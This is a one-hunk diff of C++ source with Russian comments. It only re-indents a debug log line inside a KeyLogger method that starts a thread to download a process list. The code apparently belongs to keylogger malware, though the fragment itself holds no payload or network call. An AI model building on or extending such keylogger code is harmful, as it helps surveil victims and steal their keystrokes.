@@ -2999,7 +2999,7 @@ DWORD WINAPI KeyLoggerProcListDownloader(LPVOID Data)
 void KeyLogger::StartProcessListDownloader()
 {
 	// Запустить поток подгрузки списка процессов
-    KLGDBG("UnKLG", "Запускаем поток обновления списка процессов");
+	KLGDBG("UnKLG", "Запускаем поток обновления списка процессов");
 	StartThread(KeyLoggerProcListDownloader, NULL);
 
 }
